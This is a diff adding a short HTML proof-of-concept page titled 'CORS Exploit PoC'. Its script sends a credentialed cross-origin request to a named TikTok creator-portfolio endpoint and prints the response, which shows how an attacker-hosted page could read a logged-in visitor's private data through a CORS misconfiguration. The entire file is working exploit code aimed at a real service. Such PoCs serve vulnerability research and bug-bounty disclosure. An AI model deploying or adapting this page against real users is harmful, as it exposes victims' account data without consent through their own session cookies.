@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CORS Exploit PoC</title>
+</head>
+<body>
+    <script>
+        var xhr = new XMLHttpRequest();
+        xhr.open("GET", "https://www.tiktok.com/CreativeOne/Creator/GetPortfolioVideoOptionList?cursor=0&limit=12&page=1&videoType=1", true);
+        xhr.withCredentials = true; // Sends cookies with request
+
+        xhr.onreadystatechange = function() {
+            if (xhr.readyState === 4) {
+                document.write("<pre>" + xhr.responseText + "</pre>"); // Display response
+            }
+        };
+
+        xhr.send();
+    </script>
+</body>
+</html>
